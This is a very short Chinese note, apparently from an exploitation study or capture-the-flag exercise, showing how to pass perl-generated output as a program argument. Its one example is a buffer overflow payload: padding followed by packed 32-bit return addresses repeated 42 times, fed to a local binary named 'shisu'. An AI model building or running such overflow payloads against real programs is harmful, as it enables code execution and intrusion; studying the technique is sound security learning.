# perl---输出作为程序参数

一个payload例子  

```bash
./shisu "`perl -e 'print \"A\"x12 . pack(\"LLL\", 0x08048330, 0x0804852f, 0x08048820)x42;'`"
```


2018/3/19  
